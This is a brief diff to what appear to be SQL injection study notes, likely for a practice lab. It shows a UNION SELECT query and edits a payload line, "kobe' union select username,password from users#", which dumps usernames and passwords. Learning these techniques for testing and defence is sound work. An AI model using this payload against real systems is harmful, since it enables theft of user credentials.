@@ -394,7 +394,7 @@ select email,username from users where id = 1
  union 
 select username,password from users;
 ---payload
-kobe\' union select username,password from users#
+kobe' union select username,password from users#
 
 ```
 
